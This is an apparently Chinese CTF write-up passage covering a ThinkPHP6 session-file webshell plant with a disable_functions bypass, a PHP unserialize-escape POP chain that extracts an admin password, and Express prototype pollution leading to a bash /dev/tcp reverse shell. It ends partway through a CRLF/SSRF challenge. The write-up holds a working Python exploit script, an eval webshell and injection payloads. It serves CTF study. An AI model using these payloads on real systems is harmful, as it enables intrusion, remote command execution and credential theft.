<h3 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h3><p>由于环境是<code>ThinkPHP6.0</code>，网上查了一下，找到了相关的漏洞文章：<br><a href="https://blog.csdn.net/god_zzZ/article/details/104275241">https://blog.csdn.net/god_zzZ/article/details/104275241</a><br><a href="https://paper.seebug.org/1114/#_1">https://paper.seebug.org/1114/#_1</a><br>就是通过利用<code>SESSION</code>向服务器写入文件，从而拿到shell。</p>
<p>既然是通过SESSION写入文件，我们就需要找到存在SESSION写入的位置，在<code>Member</code>控制器中发现如下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!session(<span class="string">'?UID'</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">'/home/member/login'</span>);            </span><br><span class="line">&#125;</span><br><span class="line">$data = input(<span class="string">"post."</span>);</span><br><span class="line">$record = session(<span class="string">"Record"</span>);</span><br><span class="line"><span class="keyword">if</span> (!session(<span class="string">"Record"</span>))</span><br><span class="line">&#123;</span><br><span class="line">    session(<span class="string">"Record"</span>,$data[<span class="string">"key"</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，在<code>search</code>方法中可以进行任意SESSION写入，在这个地方我们就可以写入构造好的内容来生成shell，但是首先就需要满足第一个判断，即需要一个现有的SESSION文件并且包含<code>UID</code>字段，下面就需要找到将<code>UID</code>写入SESSION的地方。<br>在<code>Member</code>控制器的<code>login</code>方法中找到如下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ($userId)&#123;</span><br><span class="line">    session(<span class="string">"UID"</span>,$userId);</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">"/home/member/index"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将<code>UID</code>写入SESSION的操作是在判断用户名和密码正确之后的，那么我们就需要先注册一个合法的用户进行登录。</p>
<p>捋一下整个的思路：</p>
<ul>
<li>1、注册一个合法账户</li>
<li>2、利用注册的账户登录时更改<code>SESSION</code>字段的值为<code>xxx.php</code>，并且刚好是32个字符</li>
<li>3、利用相同的<code>SESSION</code>在搜索的时候写入一句话</li>
<li>4、在<code>/runtime/session</code>文件夹下测试一句话，注意是<code>sess_</code>开头的</li>
</ul>
<p>参考getfly师傅的脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url_reg = <span class="string">'http://ebeb2d63-1ffd-4543-bf4d-07d0a35b9931.node3.buuoj.cn/home/member/register'</span></span><br><span class="line">url_log = <span class="string">'http://ebeb2d63-1ffd-4543-bf4d-07d0a35b9931.node3.buuoj.cn/home/member/login'</span></span><br><span class="line">url_sea = <span class="string">'http://ebeb2d63-1ffd-4543-bf4d-07d0a35b9931.node3.buuoj.cn/home/member/search'</span></span><br><span class="line">headers = &#123; <span class="string">'Cookie'</span>:<span class="string">'PHPSESSID=1234567890123456789012345678.php'</span> &#125;</span><br><span class="line">data1 = &#123;<span class="string">'username'</span>:<span class="string">'ggb0n'</span>, <span class="string">'password'</span>:<span class="string">'123456'</span>&#125;</span><br><span class="line">data2 = &#123;<span class="string">'key'</span>:<span class="string">'&lt;?php @eval($_POST["x"]);echo "not flag"; ?&gt;'</span>&#125;</span><br><span class="line">s1 = requests.post(url_reg, data1)</span><br><span class="line">s2 = requests.post(url_log, data1, headers=headers)</span><br><span class="line">s3 = requests.post(url_sea, data2, headers=headers)</span><br><span class="line">test = <span class="string">'http://ebeb2d63-1ffd-4543-bf4d-07d0a35b9931.node3.buuoj.cn/runtime/session/sess_1234567890123456789012345678.php'</span></span><br><span class="line">s = requests.get(test).text</span><br><span class="line"><span class="keyword">if</span> <span class="string">'not flag'</span> <span class="keyword">in</span> s:</span><br><span class="line">    print(<span class="string">'success'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">'failed'</span>)</span><br></pre></td></tr></table></figure>

<p>蚁剑连接小马之后在终端运行<code>/readflag</code>是没用的，利用<code>phpinfo()</code>发现是因为<code>disable_functions</code>把<code>system</code>给ban掉了：<br><img src="http://www.ggb0n.cool/images/ichunqiu28.png" alt=""><br>那就需要绕过限制，smity师傅比赛的时候就提醒需要用<code>php_gc_uaf.php</code>来绕过<code>disable_functhions</code>，一些绕过方法参考<a href="https://blog.csdn.net/jia3643/article/details/104200164">这里</a>。<br>把<code>php_gc_uaf.php</code>传到一个<code>777</code>权限的文件夹下，然后在浏览器端访问该文件即可拿到flag。</p>
<p>【补充】这个<a href="https://www.exploit-db.com/exploits/48072">exp</a>不用777权限的文件夹就能执行，web目录即可。高校战“疫”中的PHP-UAF就是用的这个。</p>
<h2 id="babyPHP"><a href="#babyPHP" class="headerlink" title="babyPHP"></a>babyPHP</h2><p>考察反序列化逃逸漏洞，这个之前在BUU上刷了<a href="http://47.107.152.5/2020/02/07/BUUCTF-web%E5%88%B7%E9%A2%98%E2%85%A0/#0CTF-2016-piapiapia">一道类似的题目</a>，不过更加复杂，比赛的时候没做出来，看了WP记录学习一下。</p>
<h3 id="题目分析-4"><a href="#题目分析-4" class="headerlink" title="题目分析"></a>题目分析</h3><p>扫描后台可以发现存在源码<code>www.zip</code>，下载后是四个php文件，我们主要分析与拿flag相关的代码。<br>首先从<code>update.php</code>中发现：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>]===<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">	<span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以发现，登陆成功之后就可以拿到flag了。</p>
<p>然后审计关键文件<code>lib.php</code>，在其中发现如下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($parm)</span></span>&#123;</span><br><span class="line">    $array= <span class="keyword">array</span>(<span class="string">'union'</span>,<span class="string">'regexp'</span>,<span class="string">'load'</span>,<span class="string">'into'</span>,<span class="string">'flag'</span>,<span class="string">'file'</span>,<span class="string">'insert'</span>,<span class="string">"'"</span>,<span class="string">'\\'</span>,<span class="string">"*"</span>,<span class="string">"alter"</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array,<span class="string">'hacker'</span>,$parm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看到这里，就想到了之前在BUU上刷的<strong>[0CTF 2016]piapiapia</strong>，那道题考察的就是反序列化溢出漏洞，这也就是分析的关键了。<br>再往下看，在<code>UpdateHelper</code>类中有一个反序列化点：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $newinfo;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($newInfo,$sql)</span></span>&#123;</span><br><span class="line">        $newInfo=unserialize($newInfo);</span><br><span class="line">        $upDate=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是从代码中可以看到，此处用户可控的只有<code>Info</code>类中的两个属性<code>age</code>、<code>nickname</code>，不能完全控制序列化数据，无法注入对象。<br>跟进<code>User</code>类中的反序列化点：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $Info=unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">    $age=$Info-&gt;age;</span><br><span class="line">    $nickname=$Info-&gt;nickname;</span><br><span class="line">    $updateAction=<span class="keyword">new</span> UpdateHelper($_SESSION[<span class="string">'id'</span>],$Info,<span class="string">"update user SET age=$age,nickname=$nickname where id="</span>.$_SESSION[<span class="string">'id'</span>]);</span><br><span class="line">    <span class="comment">//这个功能还没有写完 先占坑</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以发现，反序列化的是<code>getNewinfo()</code>方法获取的内容，再来看一下<code>getNewinfo()</code>：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $age=$_POST[<span class="string">'age'</span>];</span><br><span class="line">    $nickname=$_POST[<span class="string">'nickname'</span>];</span><br><span class="line">    <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，对<code>Info</code>类的内容序列化之后，会先经过前面提到的<code>safe()</code>函数处理，然后才进行反序列化。<br>这里就是构造反序列化逃逸的地方：通过写入黑名单中的字符\字符串，在经过<code>safe()</code>函数处理的时候会替换为<code>hacker</code>，从而改变了长度，但是序列化的字符串，每一个属性的内容长度都是固定的，从而就可以利用替换关系构造出逃逸，然后注入对象。</p>
<p>整理一下构造pop链的思路：</p>
<blockquote>
<p>利用<code>UpdateHelper</code>的<code>__destruct</code>触发<code>User</code>的<code>__toString</code>然后走到<code>Info</code>的<code>__call</code>方法，在<code>__call</code>中调用了<code>dbCtrl</code>类的<code>login</code>方法，通过控制查询语句，把<code>admin</code>账户的密码查出来。</p>
</blockquote>
<p>官方POC如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $age=<span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $nickname=<span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($age,$nickname)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname=$nickname;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UpdateHelper</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $newinfo;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hostname=<span class="string">"127.0.0.1"</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbuser=<span class="string">"root"</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbpass=<span class="string">"root"</span>;</span><br><span class="line">    <span class="keyword">public</span> $database=<span class="string">"test"</span>;</span><br><span class="line">    <span class="keyword">public</span> $name=<span class="string">'admin'</span>;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $mysqli;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">&#125;</span><br><span class="line">$d = <span class="keyword">new</span> dbCtrl();</span><br><span class="line">$d-&gt;token=<span class="string">'admin'</span>;</span><br><span class="line">$b = <span class="keyword">new</span> Info(<span class="string">''</span>,<span class="string">'1'</span>);</span><br><span class="line">$b-&gt;CtrlCase=$d;</span><br><span class="line">$a = <span class="keyword">new</span> user();</span><br><span class="line">$a-&gt;nickname=$b;</span><br><span class="line">$a-&gt;age=<span class="string">"select password,id from user where username=?"</span>;</span><br><span class="line">$c=<span class="keyword">new</span> UpdateHelper();</span><br><span class="line">$c-&gt;sql=$a;</span><br><span class="line"><span class="keyword">echo</span> serialize($c);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行结果如下</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="string">O:</span><span class="number">12</span>:<span class="string">"UpdateHelper"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">2</span>:<span class="string">"id"</span>;N;<span class="string">s:</span><span class="number">7</span>:<span class="string">"newinfo"</span>;N;<span class="string">s:</span><span class="number">3</span>:<span class="string">"sql"</span>;<span class="string">O:</span><span class="number">4</span>:<span class="string">"User"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">2</span>:<span class="string">"id"</span>;N;<span class="string">s:</span><span class="number">3</span>:<span class="string">"age"</span>;<span class="string">s:</span><span class="number">45</span>:<span class="string">"select password,id from user where username=?"</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"nickname"</span>;<span class="string">O:</span><span class="number">4</span>:<span class="string">"Info"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">3</span>:<span class="string">"age"</span>;<span class="string">s:</span><span class="number">0</span>:<span class="string">""</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"nickname"</span>;<span class="string">s:</span><span class="number">1</span>:<span class="string">"1"</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"CtrlCase"</span>;<span class="string">O:</span><span class="number">6</span>:<span class="string">"dbCtrl"</span>:<span class="number">8</span>:&#123;<span class="string">s:</span><span class="number">8</span>:<span class="string">"hostname"</span>;<span class="string">s:</span><span class="number">9</span>:<span class="string">"127.0.0.1"</span>;<span class="string">s:</span><span class="number">6</span>:<span class="string">"dbuser"</span>;<span class="string">s:</span><span class="number">4</span>:<span class="string">"root"</span>;<span class="string">s:</span><span class="number">6</span>:<span class="string">"dbpass"</span>;<span class="string">s:</span><span class="number">4</span>:<span class="string">"root"</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"database"</span>;<span class="string">s:</span><span class="number">4</span>:<span class="string">"test"</span>;<span class="string">s:</span><span class="number">4</span>:<span class="string">"name"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"admin"</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"password"</span>;N;<span class="string">s:</span><span class="number">6</span>:<span class="string">"mysqli"</span>;N;<span class="string">s:</span><span class="number">5</span>:<span class="string">"token"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"admin"</span>;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>我们的目的是逃逸字符，因此需要保证payload进入之后能保证序列化字符串能够正常反序列化，正常的序列化字符串结构如下：</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="string">O:</span><span class="number">4</span>:<span class="string">"Info"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">3</span>:<span class="string">"age"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"ggb0n"</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"nickname"</span>;<span class="string">s:</span><span class="number">7</span>:<span class="string">"ggb0n"</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"CtrlCase"</span>;N;&#125;</span><br></pre></td></tr></table></figure>

<p>其中的<code>age</code>和<code>nickname</code>是我们可控的，那么我们就可以把payload写入到<code>nickname</code>部分，然后通过将payload挤出去进行逃逸，由于属性是三个，所以我们在<code>nickname</code>中写入的payload前面加一个<code>CtrlCase</code>的属性，在最后加一个<code>}</code>，如此以来，反序列化的时候就会忽略后面的<code>CtrlCase</code>，初步构造payload如下：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="string">";s:8:"</span>CtrlCase<span class="string">";O:12:"</span>UpdateHelpe<span class="string">r":3:&#123;s:2:"</span>id<span class="string">";N;s:7:"</span>newinfo<span class="string">";N;s:3:"</span>sql<span class="string">";O:4:"</span>Use<span class="string">r":3:&#123;s:2:"</span>id<span class="string">";N;s:3:"</span>age<span class="string">";s:45:"</span>select password,id from user where username=?<span class="string">";s:8:"</span>nickname<span class="string">";O:4:"</span>Info<span class="string">":3:&#123;s:3:"</span>age<span class="string">";s:0:"</span><span class="string">";s:8:"</span>nickname<span class="string">";s:1:"</span><span class="number">1</span><span class="string">";s:8:"</span>CtrlCase<span class="string">";O:6:"</span>dbCtrl<span class="string">":8:&#123;s:8:"</span>hostname<span class="string">";s:9:"</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="string">";s:6:"</span>dbuse<span class="string">r";s:4:"</span>root<span class="string">";s:6:"</span>dbpass<span class="string">";s:4:"</span>root<span class="string">";s:8:"</span>database<span class="string">";s:4:"</span>test<span class="string">";s:4:"</span>name<span class="string">";s:5:"</span>admin<span class="string">";s:8:"</span>password<span class="string">";N;s:6:"</span>mysqli<span class="string">";N;s:5:"</span>token<span class="string">";s:5:"</span>admin<span class="string">";&#125;&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>下一步我们就需要把payload逃逸出去：由于payload一共<code>454</code>个字符，因此，我们需要构造黑名单中的内容，通过替换为<code>hacker</code>把payload挤出去，通过<code>safe()</code>函数我们可以知道，一个<code>&#39;</code>替换为<code>hacker</code>可以替换挤出5个字符，一个<code>union</code>替换为<code>hacker</code>可以挤出1个字符，那么在payload前面加上90个<code>&#39;</code>和4个<code>union</code>就可以把454个字符的payload挤出去了，构造最终payload如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">age&#x3D;&amp;nickname&#x3D;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;unionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:0:&quot;&quot;;s:8:&quot;nickname&quot;;s:1:&quot;1&quot;;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;N;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>通过POST方式，将payload打入<code>update.php</code>即可拿到经过md5加密之后的password，解密即可。<br>本道题是在BUU复现的，密码已经被改为了<code>glzjin</code>了，登录即可拿flag。</p>
<p>补充：smity师傅给了一个很详细的题解，可以好好学学这题：<a href="https://www.anquanke.com/post/id/200200">这里</a>。</p>
<h2 id="Ez-Express"><a href="#Ez-Express" class="headerlink" title="Ez_Express"></a>Ez_Express</h2><p>考察JS原型链污染，JS之前没学过，在BUU上复现的过程中慢慢学了一些，关于JS原型链的污染参考<a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">P神的文章</a>。</p>
<h3 id="题目分析-5"><a href="#题目分析-5" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目，可以看到一些提示：<br><img src="http://ggb0n.cool/images/gyctf5.png" alt=""></p>
<p>要求我们必须以<code>ADMIN</code>登录，但是这个用户又注册不了…</p>
<p>dirsearch扫后台可以发现<a href="http://www.zip的存在，把源码拿下来，看看其中的玄机。">www.zip的存在，把源码拿下来，看看其中的玄机。</a></p>
<p>在<code>index.js</code>中的<code>login</code>路由下发现突破点：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(req.body.Submit==<span class="string">"register"</span>)&#123;</span><br><span class="line">   <span class="keyword">if</span>(safeKeyword(req.body.userid))&#123;</span><br><span class="line">    res.end(<span class="string">"&lt;script&gt;alert('forbid word');history.go(-1);&lt;/script&gt;"</span>) </span><br><span class="line">   &#125;</span><br><span class="line">    req.session.user=&#123;</span><br><span class="line">      <span class="string">'user'</span>:req.body.userid.toUpperCase(),</span><br><span class="line">      <span class="string">'passwd'</span>: req.body.pwd,</span><br><span class="line">      <span class="string">'isLogin'</span>:<span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.redirect(<span class="string">'/'</span>); </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，在注册的时候存在<code>toUpperCase()</code>的使用，这个函数是存在可利用的漏洞的，即利用特殊字符进行绕过：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">toUpperCase():</span><br><span class="line">ı ==&gt; I</span><br><span class="line">ſ ==&gt; S</span><br></pre></td></tr></table></figure>

<p>另外JS中的<code>toLowerCase()</code>函数也存在对特殊字符的不规范处理：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">toLowerCase():</span><br><span class="line">İ ==&gt; i</span><br><span class="line">K ==&gt; k</span><br></pre></td></tr></table></figure>

<p>根据如上特性，我们可以利用<code>admın</code>身份进行注册，经过<code>toUpperCase()</code>处理便成了<code>ADMIN</code>从而成功登录：<br><img src="http://ggb0n.cool/images/gyctf1.png" alt=""></p>
<p>可以看到，提示了flag的位置，应该就需要RCE来进行读取了。</p>
<p>再审代码，发现<code>index.js</code>中存在<code>merge</code>和<code>clone</code>，根据在前面提到的P神的文章中的学习，猜测应该是JS原型链污染：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> merge = <span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">      merge(a[attr], b[attr]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> clone = <span class="function">(<span class="params">a</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> merge(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进一步在<code>action</code>路由下发现了<code>clone</code>的使用：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">router.post(<span class="string">'/action'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(req.session.user.user!=<span class="string">"ADMIN"</span>)&#123;res.end(<span class="string">"&lt;script&gt;alert('ADMIN is asked');history.go(-1);&lt;/script&gt;"</span>)&#125; </span><br><span class="line">  req.session.user.data = clone(req.body);</span><br><span class="line">  res.end(<span class="string">"&lt;script&gt;alert('success');history.go(-1);&lt;/script&gt;"</span>);  </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>是将<code>req</code>请求中的内容拼接到<code>session</code>的过程，显然，<code>req.body</code>是我们可控的，是考察原型链污染没错了。</p>
<p><code>action</code>路由是啥时候访问的呢？其实就是提交输入的地方：<br><img src="http://ggb0n.cool/images/gyctf.png" alt=""></p>
<h3 id="解题-6"><a href="#解题-6" class="headerlink" title="解题"></a>解题</h3><p>但是怎么才能实现原型链的污染呢？看到<code>info</code>路由下出现了<code>outputFunctionName</code>，参考另一篇<a href="https://lethe.site/2019/09/11/ByteCTF-2019-XNUCA-2019%E9%83%A8%E5%88%86web%E9%A2%98%E5%A4%8D%E7%8E%B0/#xnuca-2019-hardjs-1">文章</a>，讲了利用<code>outputFunctionName</code>进行污染的方式，payload如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"__proto__"</span>:&#123;<span class="string">"outputFunctionName"</span>:<span class="string">"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\"');var __tmp2"</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>大致含义就是：</p>
<blockquote>
<p>利用对象的<code>__proto__</code>属性，向类的原型对象<code>prototype</code>中写入一个新的属性和属性值，即<code>outputFunctionName</code>和对应的值，如此以来，该类就存在了这个属性，实例化的时候也会继承，因此当我们再去访问<code>info</code>路由的时候<code>res.outputFunctionName</code>的值已经是我们写入的payload中的RCE部分的内容了，从而即可在VPS上反弹shell。</p>
</blockquote>
<p>由于是在BUU上复现的，开一台内网主机，拿到ip之后构造payload：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"__proto__"</span>:&#123;<span class="string">"outputFunctionName"</span>:<span class="string">"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i &gt;&amp; /dev/tcp/174.1.33.241/8899 0&gt;&amp;1\"');var __tmp2"</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>同时在该内网主机上进行监听，在访问<code>action</code>路由的时候抓包更改<code>Content-Type</code>为<code>application/json</code>，并将我们如上构造的payload写入：<br><img src="http://ggb0n.cool/images/gyctf2.png" alt=""></p>
<p>前面就污染了原型链了，然后访问<code>info</code>路由进行命令的执行：<br><img src="http://ggb0n.cool/images/gyctf3.png" alt=""></p>
<p>从而拿到shell：<br><img src="http://ggb0n.cool/images/gyctf4.png" alt=""></p>
<p>然后就可以随便读取文件，拿到flag了。</p>
<p>有关JS的题目其实没怎么做过，因为还没有专门学过JS，但是JS确实越来用的越多，题也不少，很有学的必要。</p>
<h2 id="Node-Game"><a href="#Node-Game" class="headerlink" title="Node Game"></a>Node Game</h2><p>又是一道JS的题，考察<code>CRLF注入</code>、SSRF</p>
<p>CRLF注入参考<a href="https://www.cnblogs.com/uestc2007/p/10880338.html">这里</a>：</p>
<blockquote>
<p>CRLF注入漏洞，是因为Web应用没有对用户输入做严格验证，导致攻击者可以输入一些恶意字符。攻击者一旦向请求行或首部中的字段注入恶意的CRLF，就能注入一些首部字段或报文主体，并在响应中输出，所以又称为HTTP响应拆分漏洞（HTTP Response Splitting）。</p>
</blockquote>
<h3 id="题目分析-6"><a href="#题目分析-6" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目即可拿到源码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">var</span> pug = <span class="built_in">require</span>(<span class="string">'pug'</span>); <span class="comment">//</span></span><br><span class="line"><span class="keyword">var</span> morgan = <span class="built_in">require</span>(<span class="string">'morgan'</span>);</span><br><span class="line"><span class="keyword">const</span> multer = <span class="built_in">require</span>(<span class="string">'multer'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(multer(&#123;<span class="attr">dest</span>: <span class="string">'./dist'</span>&#125;).array(<span class="string">'file'</span>));</span><br><span class="line">app.use(morgan(<span class="string">'short'</span>));</span><br><span class="line">app.use(<span class="string">"/uploads"</span>,express.static(path.join(__dirname, <span class="string">'/uploads'</span>)))</span><br><span class="line">app.use(<span class="string">"/template"</span>,express.static(path.join(__dirname, <span class="string">'/template'</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> action = req.query.action?req.query.action:<span class="string">"index"</span>;</span><br><span class="line">    <span class="keyword">if</span>( action.includes(<span class="string">"/"</span>) || action.includes(<span class="string">"\\"</span>) 